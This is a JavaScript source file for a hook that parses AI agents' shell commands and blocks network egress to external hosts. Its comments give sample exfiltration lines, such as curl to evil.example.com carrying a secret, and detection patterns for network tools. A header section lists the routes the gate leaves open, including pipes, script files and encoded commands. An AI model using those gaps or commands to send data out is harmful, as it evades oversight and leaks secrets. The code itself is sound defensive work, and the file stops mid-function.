#!/usr/bin/env node
// PreToolUse hook (Bash): blocks the NAMED egress shapes the command-name deny list lets through.
// EGRESSPARSER923, owner GO for scope (a) only (2026-09-23).
//
// The deny list (agent-scaffold.ts, BASH_EGRESS_DENY) matches COMMAND NAMES with globs and has no
// negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
// plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
// shell variable. This hook closes those three shapes, plus the heredoc-fed interpreter, by PARSING
// the command:
//   1. curl to an EXTERNAL destination: a scheme-bearing URL (http:// included, which the deny list
//      cannot cover), and any positional / --url / proxy argument even WITHOUT a scheme;
//   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval, PowerShell
//      with -Command) whose code uses a network primitive and carries an EXTERNAL URL;
//   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND. A `for`
//      loop word list and the stdin of a `while read` loop (here-string or heredoc) count as such
//      assignments, split on whitespace the way a default `read` splits a line;
//   4. (EGRESSHEREDOC924, kanban 4c108004) a heredoc / here-string that IS an interpreter's program
//      (`python3 - <<'PY'`, `node <<EOF`, `powershell.exe -Command - <<'PS'`): its body is judged
//      exactly like a one-liner body (2.). For a shell (bash/sh/zsh/dash/ksh) the body gets the whole
//      analysis, as if it were the command itself.
// The command word is found past assignments, shell keywords and the PREFIX_WORDS commands with
// their own options (timeout, stdbuf, nice, nohup, env, sudo, command, exec, time), on every path.
// FALSE-POSITIVE POLICY. A body that uses a network primitive is denied for ANY external URL in it,
// even when the call goes to localhost and the URL is only payload or a comment: the one-liner rule,
// applied to heredoc bodies. ONE relaxation, from the maintainers' decision on #1669 (2026-10-06): a
// PYTHON heredoc that merely MENTIONS a primitive and a URL in TEXT (the file it writes, a comment)
// is not a call and passes. "Text" is decided by reading the program with its string literals and
// comments blanked: a primitive that survives is code and the old rule applies. The relaxation is
// OFF, and the old whole-text rule decides, for any body that (a) holds a construct that can RUN a
// string or load code (exec, eval, compile, __import__, importlib, getattr, globals, subprocess,
// os.system ... see PY_DYNAMIC), (b) imports anything outside PY_PLAIN_MODULES (so a module the
// heredoc just wrote cannot be imported to do the call), (c) has an f-string (it runs its braces,
// so its content stays code) with unbalanced braces, or a string the scan cannot read to its end.
// Not relaxed: node, perl, ruby, php, deno, bun, PowerShell, and one-liners (-c). A written script
// that is RUN BY ANOTHER COMMAND is the "network calls inside a script file" family below: the hook
// never sees it, and the relaxation does not change that, it only stops denying the WRITE of it.
// localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
// queue, approvals) go over http://localhost and a gate that cut them would silence the fleet.
// Hosts are cut with a regex, not URL(), so http://localhost:$PORT stays local, while
// localhost.evil.com and localhost@evil.com are external.
//
// PRIVATE NETWORK (maintainer decision on #1611, 2026-09-27): agents may reach private network
// targets from the shell. Local, besides the loopback names above, is decided by the LITERAL host
// string only, never by DNS: a canonical dotted-quad IPv4 in 10/8, 172.16/12, 192.168/16 or 127/8, a
// bracketed IPv6 in fc00::/7 (ULA) or fe80::/10 (link-local), or a name whose LAST label is `local`
// (mDNS, e.g. nas.local). A public name that happens to resolve to a private address stays external
// (nas.example.com), and so does every IPv4 spelling a resolver reads differently from how it looks
// (0x0a.0.0.1, 012.0.0.1, 167772161, 10.1) -- fail closed. 169.254/16 is deliberately NOT local:
// it carries the cloud instance-metadata endpoint. 100.64/10 (CGNAT) is not RFC 1918 and stays
// external. A single-label name (nas, xlocal) is external too: the resolver may complete it through
// a search domain to anywhere.
//
// HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
// and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
// is not a command; the URL from the ORIGINAL text of the same span. A heredoc body is read only
// where it is stdin to an interpreter or a `read` loop (4. and 3.); to anything else (`cat <<EOF`,
// `curl --data-binary @- <<'JSON'`) it stays inert text.
//
// WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
// the name-and-shape list will never be complete. Still open, by family:
//   - network calls INSIDE a script file: the hook sees only the outer command line;
//   - a program that reaches an interpreter through a PIPE or a file rather than through a heredoc /
//     here-string attached to the interpreter itself;
//   - a destination that a DIFFERENT command reads from stdin and turns into arguments (argument
//     builders such as xargs or parallel);
//   - values bound by builtins other than `for` and a plain `read`: array fillers (mapfile /
//     readarray), `read -a` elements beyond the first, and `read` under a non-default IFS (only
//     whitespace splitting is modelled);
//   - loop or command input that comes from a file, a process substitution or a pipe, not from a
//     literal here-string / heredoc in the command;
//   - a URL whose host is not literally in the command (the environment, a previous command, a curl
//     config file, or a value computed at runtime by a command substitution);
//   - a network primitive given a bare host and port with no URL scheme (socket-level connects): the
//     body scan finds destinations by URL scheme only;
//   - an interpreter body that reaches the network without a recognised primitive name (a subprocess
//     running a downloader, a browser driver, encoded or obfuscated code such as -EncodedCommand);
//   - every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig, wget ...).
// Closing those is direction (b): an allowlist / network-level gate, not this hook.
//
// Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
// fleet; that is today's behaviour, not a new hole. Every DENY is appended to the block log.
import { readFileSync, appendFileSync, realpathSync, mkdirSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import { maskInertLiterals } from '../self-pace-gate.mjs'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(ROOT, 'store', 'bash-egress-blocks.jsonl')
// EGRESSVENDOR925: vendor-API hosts a Bash call may reach (owner decision, per install).
// store/egress-vendor-hosts.json = { "hosts": ["api.elevenlabs.io"] }. EXACT host match only:
// no wildcard, no suffix match, no subdomain inheritance -- `elevenlabs.io.evil.com` and
// `x.api.elevenlabs.io` are other hosts. A missing or unreadable file, or an entry that is not
// a plain DNS name, means no exception: today's behaviour (deny). This is NOT
// store/egress-allowlist.json -- that one is the WebFetch / quarantine-reader list.
export const VENDOR_HOSTS_PATH = process.env.BASH_EGRESS_VENDOR_HOSTS || join(ROOT, 'store', 'egress-vendor-hosts.json')
// A plain DNS name: labels of [a-z0-9-], no leading/trailing hyphen, at least one dot, a letter TLD.
// Not an IP, not localhost, no `*`, no leading dot, no port, no userinfo.
const VENDOR_HOST = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/
export function parseVendorHosts(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.hosts) ? raw.hosts : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorHosts(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorHosts(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
// OPTIONAL, opt-in (#1611, a policy proposal): the same file may also carry
// `"domains": ["example.com"]` -- a listed domain OR any subdomain of it passes. The match is on a
// LABEL boundary: `api.example.com` matches `example.com`, while `evilexample.com`,
// `example.com.evil.net` and `example.com@evil.net` (whose host is evil.net) do not. Entries are
// shape-checked exactly like "hosts" (a plain DNS name: no wildcard, no leading dot, no IP, no
// port, no userinfo), so an IP or `*.x` can never widen the list. A missing key, a malformed
// file, or an entry that is not a plain DNS name adds nothing: today's behaviour. Kept separate
// from "hosts" on purpose, so an existing exact entry never silently becomes a suffix rule.
export function parseVendorDomains(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.domains) ? raw.domains : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorDomains(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorDomains(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
export function hostInDomains(host, domains) {
  for (const d of domains) if (host === d || host.endsWith(`.${d}`)) return true
  return false
}
const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
// One-liner URL schemes: every network scheme libcurl speaks (minus file:, and ipfs:/ipns:, which
// resolve through a gateway, not the literal host). A one-liner reaches all of them through a curl
// binding (PHP curl_exec, pycurl) or a stream wrapper (PHP ftps://, Perl LWP gopher://), so an
// http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun|powershell(?:\.exe)?|pwsh(?:\.exe)?)$/
const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
// PowerShell (WSL reaches the Windows side with powershell.exe): its code flag is -Command (any
// case, any unambiguous prefix down to -c), and its network primitives are cmdlets and aliases that
// NET_PRIMITIVE does not name. `curl` / `wget` are listed here ONLY: in PowerShell they are aliases
// of Invoke-WebRequest, while in a Python body a "curl" word is a subprocess carrying data.
const POWERSHELL = /^(?:powershell|pwsh)(?:\.exe)?$/i
const PS_CODE_FLAG = /^-c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?$/i
const PS_NET_PRIMITIVE = /\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|curl|wget|Start-BitsTransfer|Net\.WebClient|DownloadString|DownloadFile|Net\.Http\.HttpClient|Net\.Sockets)\b/i
function hasCodeFlag(cmd, args) {
  return args.some((w) => CODE_FLAG.has(w) || (POWERSHELL.test(cmd) && PS_CODE_FLAG.test(w)))
}
function usesNetwork(cmd, text) {
  return NET_PRIMITIVE.test(text) || (POWERSHELL.test(cmd) && PS_NET_PRIMITIVE.test(text))
}

// --- Python heredoc: code versus text (maintainer decision on #1669) --------------------------------
const PYTHON = /^python(?:\d+(?:\.\d+)?)?$/
// Valid string prefixes, any case: r, b, u, f, and the two-letter br / rb / fr / rf.
const PY_STRING_PREFIX = /^(?:[rR][bBfF]?|[bB][rR]?|[uU]|[fF][rR]?)$/
// Constructs that can turn a string into running code, load code, start a process or open a URL. Read on
// the program with its literals blanked, so the NAME is what is seen. Never complete, by design: it is the
// first of two fences, the module allowlist below is the second, and both fall back to the OLD rule.
const PY_DYNAMIC = new RegExp('\\b(?:exec|eval|compile|__import__|importlib|import_module|getattr|setattr|delattr|globals|locals|vars|' +
  '__builtins__|builtins|__dict__|__loader__|runpy|subprocess|pty|ctypes|pickle|marshal|timeit|cProfile|profile|pdb|code|codeop|' +
  'webbrowser|multiprocessing|system|popen|startfile|exec[lv]\\w*|spawn\\w*|fork\\w*|posix_spawn\\w*)\\b')
// Modules a file-writing script plainly uses. Anything else, a module the heredoc may just have written
// included, sends the body back to the old whole-text rule.
const PY_PLAIN_MODULES = new Set(['os', 'sys', 'json', 're', 'pathlib', 'datetime', 'time', 'textwrap', 'shutil', 'csv', 'io',
  'hashlib', 'base64', 'collections', 'itertools', 'math', 'string', 'tempfile', 'glob', 'argparse', 'html', 'unicodedata', 'uuid',
  'random', 'statistics', 'zipfile', 'tarfile', 'difflib', 'pprint', 'typing', 'dataclasses', 'functools', 'operator', 'enum', 'fnmatch'])
// The program with its string literals and comments blanked (newlines kept), or null when the scan cannot
// vouch for where a string ends. An f-string is NOT blanked: it runs its braces, so its text counts as code.
export function pythonCodeOnly(text) {
  const out = []
  const n = text.length
  let i = 0
  while (i < n) {
    const c = text[i]
    if (c === '#') {
      let j = text.indexOf('\n', i)
      if (j === -1) j = n
      out.push(' '.repeat(j - i)); i = j; continue
    }
    if (c !== '"' && c !== "'") { out.push(c); i++; continue }
    let k = i
    while (k > 0 && /[A-Za-z0-9_]/.test(text[k - 1])) k--
    const word = text.slice(k, i)
    if (word !== '' && !PY_STRING_PREFIX.test(word)) return null   // return"x", ab"x": not a plain literal
    const triple = text.startsWith(c.repeat(3), i)
    const delim = triple ? c.repeat(3) : c
    let j = i + delim.length
    let closed = false
    while (j < n) {
      if (text[j] === '\\') { j += 2; continue }
      if (text.startsWith(delim, j)) { closed = true; break }
      if (!triple && text[j] === '\n') return null                // unterminated single-line string
      j++
    }
    if (!closed) return null
    const body = text.slice(i + delim.length, j)
    if (/[fF]/.test(word)) {
      // Brace balance: an unbalanced f-string means this scan ended it where Python (3.12 allows the same
      // quote inside the braces) did not, and from there on the scan would be blanking real code.
      const open = (body.match(/\{/g) ?? []).length, close = (body.match(/\}/g) ?? []).length
      if (open !== close) return null
      out.push(delim + body + delim)
    } else {
      out.push(delim + body.replace(/[^\n]/g, ' ') + delim)
    }
    i = j + delim.length
  }
  return out.join('')
}
function pythonImportsPlain(code) {
  for (const raw of code.split(/[\n;]/)) {
    const st = raw.trim()
    if (!/\bimport\b/.test(st)) continue
    let m
    if ((m = /^import\s+(.+)$/.exec(st))) {
      for (const part of m[1].split(',')) if (!PY_PLAIN_MODULES.has(part.trim().split(/\s+/)[0].split('.')[0])) return false
    } else if ((m = /^from\s+([\w.]+)\s+import\b/.exec(st))) {
      if (!PY_PLAIN_MODULES.has(m[1].split('.')[0])) return false
    } else return false                                           // `try: import x`, `x = 1; import` glued forms
  }
  return true
}
// Does this Python body USE the network, as opposed to MENTION it? Only a primitive in CODE counts, and
// only when nothing in the body can run a string or load code (see the header).
function pythonUsesNetwork(text) {
  // Python reads identifiers as NFKC, so a fullwidth `ｅｘｅｃ(...)` is `exec(...)`: normalize first, or
  // the fence below does not see it. The fallback rule reads the normalized text too, which is stricter.
  text = text.normalize('NFKC')
  const code = pythonCodeOnly(text)
  if (code === null || PY_DYNAMIC.test(code) || !pythonImportsPlain(code)) return NET_PRIMITIVE.test(text)
  return NET_PRIMITIVE.test(code)
}
// Words that can stand before the real command word of a sub-command. The shell keywords are here
// because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
// them a curl inside a loop or an if/then body was never looked at.
export const PREFIX_WORDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice',
  'timeout', 'stdbuf', 'do', 'then', 'else', 'elif', '{', '(', '!'])
// A prefix COMMAND (not a keyword) may carry its own options before the real command word:
// `timeout -k 5 30 cmd`, `stdbuf -oL cmd`, `nice -n 5 cmd`, `env -u X A=1 cmd`, `sudo -u u cmd`.
// Every word starting with `-` is skipped; the options listed here also consume the next word.
// `timeout` additionally takes one positional DURATION. A missing entry here errs toward reading an
// option VALUE as the command word, which only hides a command; the per-prefix test catches that.
const PREFIX_OPT_VALUE = {
  env: new Set(['-u', '--unset', '-C', '--chdir', '-S', '--split-string']),
  sudo: new Set(['-u', '--user', '-g', '--group', '-h', '--host', '-p', '--prompt', '-C', '--close-from',
    '-D', '--chdir', '-r', '--role', '-t', '--type', '-U', '--other-user', '-T', '--command-timeout']),
  exec: new Set(['-a']),
  nice: new Set(['-n', '--adjustment']),
  timeout: new Set(['-s', '--signal', '-k', '--kill-after']),
  stdbuf: new Set(['-o', '--output', '-e', '--error', '-i', '--input']),
}
const PREFIX_COMMANDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice', 'timeout', 'stdbuf'])
const PREFIX_POSITIONALS = { timeout: 1 }
// Index of the real command word in `mw` (a sub-command's words): assignments, prefix words and
// the prefix commands' own options and arguments are skipped.
export function commandIndex(mw) {
  let i = 0
  while (i < mw.length) {
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i])) { i++; continue }
    const p = mw[i].split('/').pop()
    if (!PREFIX_WORDS.has(p)) break
    i++
    if (!PREFIX_COMMANDS.has(p)) continue
    const withValue = PREFIX_OPT_VALUE[p] ?? new Set()
    let positional = PREFIX_POSITIONALS[p] ?? 0
    while (i < mw.length) {
      const a = mw[i]
      if (a === '--') { i++; break }
      if (a.startsWith('-') && a.length > 1) { i += withValue.has(a) ? 2 : 1; continue }
      if (positional > 0 && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(a)) { positional--; i++; continue }
      break
    }
  }
  return i
}
// A one-liner is a DOWNLOADER only when its code uses a network primitive of the language itself.
// Measured on 7 days of fleet commands: a one-liner that merely CARRIES a URL as data (an
// inter-agent message built with subprocess + curl to localhost) must not be denied -- that was 4 of
// 10 would-be blocks. Browser automation (chromium / playwright / puppeteer) is deliberately NOT in
// this list: it is the fleet's mandated browser-verify path on its own domains, and an own-domain
// allowlist is direction (b). Stated as open, measured, and left to the owner.
const NET_PRIMITIVE = /\b(?:urllib|requests\.|http\.client|httplib|httpx|aiohttp|urlopen|socket\.|fetch\s*\(|https?\.(?:get|request)\s*\(|axios|node-fetch|undici|got\s*\(|LWP::|HTTP::Tiny|Net::HTTP|open-uri|IO::Socket|file_get_contents|curl_exec|Invoke-WebRequest)|-M(?:LWP|HTTP::Tiny|IO::Socket|Net::HTTP)/

export function hostOf(url) {
  const m = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/i.exec(url)
  return m ? m[1].toLowerCase() : null
}
// Canonical dotted-quad only: no leading zero, no hex/octal/decimal/short forms.
const OCTET = '(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)'
const CANON_IPV4 = new RegExp(`^${OCTET}(?:\\.${OCTET}){3}$`)
const MDNS_NAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+local$/
// A private-network target by its literal spelling (see the PRIVATE NETWORK note in the header).
export function isPrivateTarget(host) {
  const h = String(host ?? '').toLowerCase()
  if (CANON_IPV4.test(h)) {
    const [a, b] = h.split('.').map(Number)
    return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
  }
  const v6 = /^\[([0-9a-f:.]+)\]$/.exec(h)
  if (v6) return /^f[cd][0-9a-f]{0,2}:/.test(v6[1]) || /^fe[89ab][0-9a-f]?:/.test(v6[1])
  return MDNS_NAME.test(h)
}
export function isLocalHost(host) { return LOCAL_HOSTS.has(host) || isPrivateTarget(host) }
export function isExternal(url) {
  const h = hostOf(url)
  if (h === null || h === '') return false
  return !isLocalHost(h)
}
function spans(masked) {
  const out = []; let start = 0
  const re = /&&|\|\||;|\||\n/g; let m
  while ((m = re.exec(masked))) { out.push([start, m.index]); start = m.index + m[0].length }
  out.push([start, masked.length])
  return out
}
function words(s) { return s.trim().split(/\s+/).filter(Boolean) }
function collectAssignments(orig, masked) {
  const env = {}
  for (const [a, b] of spans(masked)) {
    const seg = orig.slice(a, b)
    for (const m of seg.matchAll(/(?:^|\s)(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s]*))/g)) {
      env[m[1]] = m[3] ?? m[4] ?? m[5] ?? ''
    }
  }
  return env
}
// `for NAME in w1 w2 ...`: the loop variable takes EACH value in turn.
// NAME=value alone never saw it, so `for u in https://x ...; do curl "$u"; done` reached curl with an
// unread destination and passed, while the same URL as a literal or a plain assignment was denied.
// The keyword is found in the MASKED text (a quoted "for u in" is not a loop), the values are read
// from the ORIGINAL text, unquoted, with this command's assignments expanded in them.
function collectLoops(orig, masked, env) {
  const loops = {}
  for (const [a, b] of spans(masked)) {
    const m = /(?:^|[\s(!{])for\s+([A-Za-z_][A-Za-z0-9_]*)\s+in(?=\s|$)/.exec(masked.slice(a, b))
    if (!m) continue
    const vals = shellWords(expand(orig.slice(a + m.index + m[0].length, b), env))
    loops[m[1]] = [...(loops[m[1]] ?? []), ...vals]
  }
  return loops
}
// Every reading of a span a loop can produce: one text per loop value (per combination, for nested
// loops). Past MAX_LOOP_VARIANTS the span is not judged value by value: null, and the caller fails
// closed -- a hand-written URL loop is a few values, never hundreds.
const MAX_LOOP_VARIANTS = 64
// A value goes into the text as ONE word: pasting `'{"a":"b c"}'` raw broke the command's own
// quoting, and its fragments were read as hosts (measured on the fleet's week of commands: a loop
// of JSON bodies posted to localhost with -d "$p" was denied). A URL never holds whitespace or a
// quote, so such a value is replaced by the first URL inside it, or by a neutral word.
function asWord(value) {
  if (/^[^\s'"`\\]+$/.test(value)) return value
  return (String(value).match(URL_RE) ?? [])[0] ?? 'x'
}
function loopVariants(text, env, loops) {
  let out = [text]
  for (const [v, vals] of Object.entries(loops)) {
    const re = new RegExp(`\\$\\{${v}\\}|\\$${v}(?![A-Za-z0-9_])`, 'g')
    if (!re.test(text)) continue
    re.lastIndex = 0
    out = out.flatMap((t) => vals.map((x) => t.replace(re, () => asWord(x))))
    if (out.length > MAX_LOOP_VARIANTS) return null
  }
  return out.map((t) => expand(t, env))
}
function expand(text, env) {
  return text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (all, a, b) => (env[a ?? b] ?? all))
}
// $( ... ) and backtick substitutions are commands of their own: lift them out (length-preserving,
// so offsets still align), classify each inner command separately, and parse the rest without them.
// Without this, every `-H "Authorization: Bearer $(cat token)"` made maskInertLiterals give up:
// measured, 32% of fleet commands were unparseable and would have been allowed blind.
// Quote-aware, with the SAME rules as maskInertLiterals: a substitution is lifted only where the
// shell would run it (top level, inside "...", inside an unquoted-tag heredoc body). Inside '...',
// $'...' and a quoted-tag heredoc body it is inert text. Lifting it there turned every HANDOFF.md
// written with `cat > f <<'EOF'` that mentions a curl in backticks into a false deny.
function substEnd(text, i) { // text[i..] starts with $( -> index just past the matching )
  let depth = 1, j = i + 2, q = null
  while (j < text.length && depth > 0) {
    const c = text[j]
    if (q) { if (c === q) q = null; else if (c === '\\' && q === '"') j++ }
    else if (c === "'" || c === '"') q = c
    else if (c === '(') depth++
    else if (c === ')') depth--
    j++
  }
  return j
}
function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
  let j = i + 1
  while (j < text.length && text[j] !== '`') j += text[j] === '\\' ? 2 : 1
  return Math.min(j + 1, text.length)
}
export function liftSubstitutions(text) {
  // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
  // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
  const inners = []; const herestrings = []; let out = ''; let i = 0
  // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
  const lift = (at) => {
    if (text[at] === '$' && text[at + 1] === '(') {
      const j = substEnd(text, at)
      inners.push(text.slice(at + 2, j - 1)); out += ' '.repeat(j - at); return j
    }
    if (text[at] === '`') {
      const j = backtickEnd(text, at)
      inners.push(text.slice(at + 1, j - 1)); out += ' '.repeat(j - at); return j
    }
    return -1
  }
  // Copy [from, to) in a live context (double quotes, unquoted heredoc body). An escaped \` or \$
  // is literal text here, but maskInertLiterals gives up on ANY backtick or $( inside "...", so it is
  // blanked (length-preserving): measured, 58 of 78 unparseable fleet commands were exactly this
  // (a `gh pr comment --body "... \`code\` ..."`).
  const copyLive = (from, to) => {
    let k = from
    while (k < to) {
      if (text[k] === '\\' && (text[k + 1] === '`' || text[k + 1] === '$')) { out += '  '; k += 2; continue }
      if (text[k] === '\\') { out += text.slice(k, Math.min(k + 2, to)); k += 2; continue }
      const n = lift(k)
      if (n !== -1) { k = n; continue }
      out += text[k]; k++
    }
  }
  while (i < text.length) {
    const c = text[i]
    if (c === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
    // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
    // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
    // and the word after it is parsed as ordinary (quoted or live) text.
    if (text.startsWith('<<<', i)) { herestrings.push(i); out += '   '; i += 3; continue }
    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
    if (here) {
      const tag = here[1] ?? here[2] ?? here[3]
      const quotedTag = here[1] != null || here[2] != null
      out += here[0]; i += here[0].length
      const nl = text.indexOf('\n', i)
      if (nl === -1) { copyLive(i, text.length); break }
      // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
      // by processing it recursively, then continue with the body
      const lineRest = liftSubstitutions(text.slice(i, nl + 1))
      out += lineRest.stripped; inners.push(...lineRest.inners)
      herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
      const rel = endRx.exec(text.slice(i))
      const bodyEnd = rel ? i + rel.index : text.length
      if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
      i = bodyEnd
      continue
    }
    if (c === "'") {
      const end = text.indexOf("'", i + 1)
      const stop = end === -1 ? text.length : end + 1
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '$' && text[i + 1] === "'") {
      let j = i + 2
      while (j < text.length && text[j] !== "'") j += text[j] === '\\' ? 2 : 1
      const stop = Math.min(j + 1, text.length)
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') {
        if (text[j] === '\\') { j += 2; continue }
        if (text[j] === '$' && text[j + 1] === '(') { j = substEnd(text, j); continue }
        if (text[j] === '`') { j = backtickEnd(text, j); continue }
        j++
      }
      out += '"'
      if (j >= text.length) { copyLive(i + 1, text.length); i = text.length; continue }
      copyLive(i + 1, j); out += '"'; i = j + 1; continue
    }
    const n = lift(i)
    if (n !== -1) { i = n; continue }
    out += c; i++
  }
  return { stripped: out, inners, herestrings }
}
// curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
// curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
// the host while URL_RE (which needs a scheme) and the name list (`curl *https://*`) both miss it.
// So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
// connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
// Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
// never read as a destination. An unknown long option is assumed to take no value: if that is
// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
const CURL_LONG_WITH_VALUE = new Set([
  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
  // destination-bearing: read below, still consumed as values
  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
  'doh-url', 'connect-to', 'resolve',
])
const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i

// Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
export function shellWords(text) {
  const out = []; let cur = null; let i = 0
  const push = () => { if (cur !== null) out.push(cur); cur = null }
  while (i < text.length) {
    const c = text[i]
    if (/\s/.test(c)) { push(); i++; continue }
    cur ??= ''
    if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
      i = j + 1; continue
    }
    if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
    cur += c; i++
  }
  push()
  return out
}
// The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
// (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
// the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
// (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
// too (`$PROTO://host`), so everything up to `://` is dropped.
export function destHost(value) {
  if (!value) return null
  const noScheme = value.replace(/^[^/?#\s]*:\/\//, '')
  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
  const h = m ? m[1].toLowerCase() : ''
  if (HOSTNAME.test(h)) return h
  // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
  // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
  // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
